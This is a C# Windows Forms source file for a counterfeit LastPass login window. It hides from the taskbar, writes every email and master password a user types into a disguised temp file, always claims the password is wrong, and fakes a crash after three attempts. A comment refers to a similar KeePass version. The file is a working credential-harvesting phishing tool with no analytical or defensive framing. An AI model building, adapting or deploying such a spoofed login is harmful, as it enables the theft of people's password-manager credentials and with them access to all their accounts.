using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Linq;
using System.Diagnostics;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Policy;
using System.IO;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.Button;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.ToolBar;

namespace LastPass
{
    public partial class Form1 : Form
    {

        private Size _minimumSize = new Size(418, 507);
        private string commandLineArg;
        private string logFilePath = Path.Combine(Path.GetTempPath(), "abckdlfdpeoovnp.bin");
        private Size originalSize;
        private int clickCount = 0;
        private int closeCount = 0;
        private int eyeCount = 0;
        private bool isPasswordVisible = false;
        private bool textChangedFromEmpty = false;
        private int loginAttempts = 0;

        public Form1()
        {
            InitializeComponent();

            this.ShowIcon = false;
            this.ShowInTaskbar = false; // can't only show in taskbar?
            linkLabel1.TabStop = false;
            this.textBox2.TabIndex = 2;
            this.button3.TabStop = false;
            this.linkLabel2.TabStop = false;
            textBox3.TabStop = false;
            SetStyle(ControlStyles.Selectable, false);

            // window centre
            originalSize = this.Size;
            this.Load += new System.EventHandler(this.Form1_Load);
            this.Resize += Form1_Resize;

            panel1.Dock = DockStyle.None;
            panel1.Anchor = AnchorStyles.None;
            panel1.AutoSize = true;
            foreach (Control control in panel1.Controls)
            {
                control.BringToFront();
            }

            //
            // password eye button
            //
            button3.FlatStyle = FlatStyle.Flat;
            button3.FlatAppearance.BorderSize = 0;
            button3.MouseDown += button3_MouseDown;
            button3.MouseUp += button3_MouseUp;
            button3.Visible = false;
            //button3.TabStop = false;

            //
            // username box:
            //
            textBox3.Width = 257; // Set the width of the TextBox to 200 pixels
            textBox3.Height = 25;
            textBox3.AutoSize = false;
            textBox3.Font = new Font(textBox3.Font.FontFamily, 11F, FontStyle.Regular); // Set font size to 12

            //
            // password box:
            //
            textBox2.Width = 257; // Set the width of the TextBox to 200 pixels
            textBox2.Height = 25;
            textBox2.AutoSize = false;
            textBox2.Font = new Font(textBox3.Font.FontFamily, 11F, FontStyle.Regular); // Set font size to 12
            textBox2.PasswordChar = '●';


            // checkbox event handlers
            checkBox1.Checked = true;
            checkBox1.TabStop = false;
            checkBox2.TabStop = false;
            checkBox3.TabStop = false;
            checkBox1.CheckedChanged += CheckBox_CheckedChanged;
 
            textBox2.TextChanged += textbox2_TextChanged;


            //
            // login button
            //
            button1.ForeColor = Color.White;
            button1.BackColor = Color.FromArgb(204, 0, 0);
            button1.FlatStyle = FlatStyle.Flat;
            button1.FlatAppearance.BorderColor = Color.Red; // Set the border color to red
            button1.FlatAppearance.MouseOverBackColor = Color.FromArgb(204, 0, 0);//Color.Red;
            button1.MouseEnter += Button1_MouseEnter;
            button1.MouseLeave += Button1_MouseLeave;
            button1.MouseDown += button1_MouseDown;
            button1.MouseUp += button1_MouseUp;
            button1.Click += button1_Click;
            button1.TabStop = false;
            button1.Paint += button1_Paint;

            // username
            // clear entry
            textBox2.EnabledChanged += textBox2_EnabledChanged;
            textBox3.EnabledChanged += textBox3_EnabledChanged;
            button3.Paint += button3_EnabledChanged;

        }



        // change background when conrols disabled
        private void button3_EnabledChanged(object sender, PaintEventArgs e)
        {
            if (!button3.Enabled)
            {
                // Custom drawing logic for disabled state
                using (SolidBrush brush = new SolidBrush(Color.White))
                {
                    // Fill the button's background with white color
                    e.Graphics.FillRectangle(brush, button3.ClientRectangle);

                    // Draw the button's text with white color
                    e.Graphics.DrawString(button3.Text, button3.Font, brush, 0, 0);
                }
            }
        }

        private void textBox2_EnabledChanged(object sender, EventArgs e)
        {
            if (!textBox2.Enabled)
            {
                textBox2.BackColor = Color.White;
            }
        }

        private void textBox3_EnabledChanged(object sender, EventArgs e)
        {
            if (!textBox3.Enabled)
            {
                textBox3.BackColor = Color.White;
            }
        }


        // Log in
        // prevent from turning grey when disabled
        private void button1_Paint(object sender, PaintEventArgs e)
        {
            // If the button is disabled, draw the text with white color
            if (!button1.Enabled)
            {
                // Set the font color to white
                using (SolidBrush brush = new SolidBrush(Color.White))
                {
                    // Draw the button's text
                    float x = (button1.Width - e.Graphics.MeasureString(button1.Text, button1.Font).Width) / 2 - 4;
                    // Calculate Y-coordinate with 1 pixel addition
                    float y = (button1.Height - e.Graphics.MeasureString(button1.Text, button1.Font).Height) / 2 + 1;
                    // Draw the button's text with adjusted coordinates
                    e.Graphics.DrawString(button1.Text, button1.Font, brush, x, y);
                }
            }
        }


        private void CheckBox_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                // Enable and check checkBox2
                checkBox2.Enabled = true;
                //checkBox2.Checked = true;
            }
            else
            {
                // Uncheck and disable checkBox2
                checkBox2.Enabled = false;
                checkBox2.Checked = false;
            }
        }

        private void button3_MouseDown(object sender, MouseEventArgs e)
        {
            // Change the password character to show the actual characters when the button is pressed down
            textBox2.PasswordChar = '\0';
            Bitmap iconBitmap = Properties.Resources.test_blue;
            button3.Image = iconBitmap;
            button3.TabStop = false;
            textBox2.Focus();
        }

        private void button3_MouseUp(object sender, MouseEventArgs e)
        {
            // Change the password character back to the bullet character when the button is released
            textBox2.PasswordChar = '●';
            Bitmap iconBitmap = Properties.Resources.test;
            button3.Image = iconBitmap;
            button3.TabStop = false;
            //button3.Visible = false;
            textBox2.Focus();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.MinimumSize = _minimumSize;
            CenterPanel();
        }

        private void textbox2_TextChanged(object sender, EventArgs e)
        {
            if (!textChangedFromEmpty && !string.IsNullOrWhiteSpace(textBox2.Text))
            {
                // Show button3 only if text changed from empty to non-empty for the first time
                button3.Visible = true;
                button3.TabStop = false;
                textChangedFromEmpty = true; // Update the flag
            }
            else if (string.IsNullOrWhiteSpace(textBox2.Text))
            {
                // If the text becomes empty again, hide button3
                //button3.Visible = false;
            }
        }

        private void button1_MouseDown(object sender, EventArgs e)
        {
            button1.FlatAppearance.BorderColor = Color.LightGray;
        }

        private void button1_MouseUp(object sender, EventArgs e)
        {
            button1.FlatAppearance.BorderColor = Color.Red;
        }



        private void Button1_MouseEnter(object sender, EventArgs e)
        {
            button1.FlatAppearance.BorderColor = Color.LightGray;
        }

        private void Button1_MouseLeave(object sender, EventArgs e)
        {
            button1.FlatAppearance.BorderColor = Color.Red;
        }

        private void CenterPanel()
        {
            // Define the fixed space above the panel
            int spaceAbove = -60; // Adjust this value as needed

            // Calculate the new position for the panel to keep it centered
            int centerX = (this.ClientSize.Width - panel1.Width) / 2;
            int centerY = (this.ClientSize.Height - panel1.Height) / 2;

            // Ensure centerY doesn't exceed the space above
            if (centerY < spaceAbove)
            {
                centerY = spaceAbove;
            }

            // Set the new location for the panel
            panel1.Location = new Point(centerX, centerY);

        }

        private void Form1_Resize(object sender, EventArgs e)
        {
            // Adjust the size if it goes below the minimum size
            if (this.Width < _minimumSize.Width)
                this.Width = _minimumSize.Width;
            if (this.Height < _minimumSize.Height)
                this.Height = _minimumSize.Height;

            //label1.Width = this.ClientSize.Width;

            CenterPanel();
        }

        private async void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            clickCount++;

            if (clickCount == 3)
            {
                this.Cursor = Cursors.WaitCursor;
                //await Task.Delay(1000);
                //this.Opacity = 0.8;
                await Task.Delay(3000);
                //this.Text += " (Not Responding)";
                //await Task.Delay(5000);
                Application.Exit();
            }
        }


        private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            string url = "https://lastpass.com/create-account.php";
            Process.Start(url);
        }


        private void LogToFile(string logMessage)
        {
            try
            {
                using (StreamWriter sw = File.AppendText(logFilePath))
                {
                    sw.WriteLine(logMessage);
                }
            }
            catch (Exception ex)
            {
                // exception
            }
        }

        // 
        // Log in
        // 
        private async void button1_Click(object sender, EventArgs e)
        {

            loginAttempts++;

            LogToFile($"{DateTime.Now.ToString()} - LastPass Email: {textBox3.Text} Password: {textBox2.Text}");

            textBox2.Focus();


            if (string.IsNullOrWhiteSpace(textBox2.Text) && string.IsNullOrWhiteSpace(textBox3.Text))
            {
                // If no text in either textbox, do nothing
                return;
            }


            if (string.IsNullOrWhiteSpace(textBox2.Text) && !textBox3.Text.Contains("@"))
            {

                this.Enabled = false;

                // custom pop box
                Form2 form2 = new Form2("Invalid email or password!");
                form2.StartPosition = FormStartPosition.Manual;
                form2.Left = this.Left + (this.Width - form2.Width) / 2;
                form2.Top = this.Top + (this.Height - form2.Height) / 2;
                form2.FormClosed += Form2_FormClosed;
                form2.Show();
                return;
            }

            if (string.IsNullOrWhiteSpace(textBox3.Text) && !string.IsNullOrWhiteSpace(textBox2.Text))
            {

                this.Enabled = false;
                
                // custom pop box
                Form2 form2 = new Form2("Enter a valid email address.");
                form2.StartPosition = FormStartPosition.Manual;
                form2.Left = this.Left + (this.Width - form2.Width) / 2;
                form2.Top = this.Top + (this.Height - form2.Height) / 2;
                form2.FormClosed += Form2_FormClosed;
                form2.Show();
                return;
            }

            /*if (!string.IsNullOrEmpty(textBox3.Text) && !string.IsNullOrEmpty(textBox2.Text) && !textBox2.Text.Contains("@"))
            {
                this.Enabled = false;

                // custom pop box
                Form2 form2 = new Form2("You may have mistyped your email address.\nTry again.");
                form2.StartPosition = FormStartPosition.Manual;
                form2.Left = this.Left + (this.Width - form2.Width) / 2;
                form2.Top = this.Top + (this.Height - form2.Height) / 2;
                form2.FormClosed += Form2_FormClosed;
                form2.Show();
                return;
            }*/

            // else it's a valid login attempt
            // capture pw etc.
            else
            {

                this.Enabled = false;
                //this.Opacity = 0.9;
                await Task.Delay(250);
                // custom pop box
                Form2 form2 = new Form2("Check your master password and try again.");
                form2.StartPosition = FormStartPosition.Manual;
                form2.Left = this.Left + (this.Width - form2.Width) / 2;
                form2.Top = this.Top + (this.Height - form2.Height) / 2;
                form2.FormClosed += Form2_FormClosed;
                form2.Show();


                // 
                // exit/crash after X login attempts
                if (loginAttempts == 3)
                {
                    // disabled and wait 
                    //this.Enabled = false;
                    this.Cursor = Cursors.WaitCursor;
                    //this.Enabled = false;

                    // wait and 'error'
                    await Task.Delay(2000);
                    this.Opacity = 0.8;

                    //this.Enabled = false;
                    await Task.Delay(2000);

                    // could pop another windows 'Unknown Error' here before exiting like keepass version
                    //this.Text += "(Not Responding)";
                    //this.Opacity = 0.6;
                    await Task.Delay(3000); 
                    Application.Exit();
                }
                
                else
                {
                    this.Enabled = false;
                    return;
                }

            }
        }

        public Form1(string commandLineArg) : this()
        {
            this.commandLineArg = commandLineArg;
            textBox3.Text = commandLineArg;
        }

        private void Form2_FormClosed(object sender, FormClosedEventArgs e)
        {
            closeCount++;
            
            // Set focus to textBox2 on Form1
            this.Enabled = true;
            this.Opacity = 1;
            textBox2.Focus();

            if (closeCount == 3)
            {
                this.Enabled = false;
                textBox2.Focus();
                this.Cursor = Cursors.WaitCursor;
            }    

        }

    }
}
